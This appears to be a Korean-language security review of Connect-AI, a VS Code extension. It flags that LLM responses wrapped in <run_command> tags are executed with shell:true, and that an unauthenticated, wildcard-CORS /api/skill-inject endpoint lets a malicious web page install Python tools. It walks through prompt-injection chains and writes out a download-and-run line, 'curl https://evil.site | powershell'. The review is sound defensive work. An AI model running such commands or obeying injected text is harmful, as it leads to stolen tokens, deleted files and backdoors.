분리를 시작했지만, 이미 20,000줄이 된 후였다. 바이브 코딩의 함정은 결과가 빠르게 나오기 때문에 멈추지 않는다는 것이다. 리팩토링은 "지금 돌아가는 것"을 멈추고 해야 하는데, 그 타이밍이 오지 않는다.

HIGH activate() Lifecycle 과부하 GPT 추가
VS Code 시작 시 LLM 자동화·텔레그램 폴링·매출 모니터링·브리핑 생성이 즉시 동시 시동됨. 각 루프가 activate()에 묶여 있어 개별 비활성화·격리·디버깅이 불가능.
CS 관점 Peter 지적
스케줄링 없는 동시 시동은 기본기 문제다. ① 의존성 순서 무시 — DailyBriefingLoop는 LLM이 로드된 후 시작해야 하지만 cold start 상태에서 호출이 날아간다. ② 리소스 경합 — LLM 로딩 + Telegram 폴링 + PayPal 요청이 동시에 뜨면 VS Code 시작이 눈에 띄게 느려진다. ③ 단일 장애점 — 하나가 예외를 던지면 전체 activate()에 영향, 독립적 격리 불가능.
activate() → SchedulerService 하나만 시동 → 각 서비스가 자신의 의존성 충족 시 스스로 시작 → 실패해도 다른 서비스에 영향 없음
개선: SchedulerService 패턴으로 분리 → 레이지 활성화 + 기능별 opt-in 제어
CRITICAL runCommandCaptured(shell:true) — Prompt Injection → Command Execution High→Critical 상향
초기 분석(스냅샷)에서는 High로 분류했으나, 실제 코드 직접 확인 결과 Critical로 상향. — A안: High / 코드 확인 후: Critical / GPT: "High at minimum, potentially Critical" GPT 의견 일치

코드에서 확인된 실제 흐름 (L.21554~21580):
// AI 응답에서 명령을 파싱해 직접 실행 const cmdRegex = /<(?:run_command|command|bash|terminal)>([\s\S]*?)<\/...>/gi; while ((match = cmdRegex.exec(aiMessage)) !== null) { // ← aiMessage = LLM 응답 let cmd = match[1].trim(); // ← AI가 생성한 문자열 await runCommandCaptured(cmd, rootPath, ...); // ← shell:true로 실행 }
shell:true 자체가 위험한 것이 아니라, AI가 만든 문자열이 shell:true로 들어가는 구조가 위험하다.
공격 시나리오: 악의적 웹 콘텐츠 → LLM 프롬프트 인젝션 → <run_command> 태그 삽입 → shell:true 실행
CRITICAL /api/skill-inject — Remote Python Tool Installation
인증 없는 HTTP 엔드포인트가 Python 스크립트를 에이전트 도구 디렉터리에 직접 설치. Wildcard CORS로 인해 피해자가 악성 페이지를 방문하는 것만으로 원격 트리거 가능.
POST /api/skill-inject { agent, name, script } ↓ Python script → _agents/{agentId}/tools/{safeName}.py ↓ Agent tool availability (next cycle) ↓ runTool → _handleCorporatePrompt(<run_command>python tool.py</run_command>) ↓ shell:true 실행
인증 없음 + Wildcard CORS (*) = 브라우저 경유 원격 공격 가능.
악성 웹페이지 → fetch('http://127.0.0.1:4825/api/skill-inject', { method:'POST', ... }) → Python 도구 설치 → 다음 에이전트 사이클에서 <run_command>로 실행.

🟢 Round 2 Addendum — Agent B (GPT) 수정 평가 코드 직접 확인 후 기존 평가: runCommandCaptured(shell:true) — Severity: High
수정 평가: AI-Generated Command Execution via shell:true — Severity: Critical

증거 — 확인된 실행 경로:
User Input → LLM Response (aiMessage) ↓ <run_command>...</run_command> 파싱 ↓ runCommandCaptured(cmd) → shell:true 실행
왜 Critical인가:
문제는 shell:true 자체가 아니다. LLM Output = Executable Code 가 되어 있다는 점이다. 이는 단순 Command Injection이 아니라 Arbitrary Command Execution에 가깝다. 공격자가 명령 일부를 주입하는 게 아니라 명령 자체를 생성할 수 있기 때문이다.

실제 공격 시나리오: Brain 문서에 curl https://evil.site | powershell 실행 지시가 포함되면 LLM이 <run_command> 태그로 감싸 즉시 실행.

Connect-AI에서 특히 위험한 이유: 일반 챗봇이 아니다. Local filesystem / Git / Brain / Telegram / Calendar / PayPal / HTTP bridge 접근권 보유 → 공격 성공 시 Brain 유출 / GitHub 토큰 탈취 / 파일 삭제 / 백도어 설치까지 이어질 수 있다.

아키텍처 평가: 리팩토링 문제가 아니라 신뢰 경계 위반(Trust Boundary Violation)이다. 현재 구조는 모델 출력을 실행 권한으로 취급하고 있다.

  • 장기: LLM → Tool Request → Policy Engine → User Approval → Execution
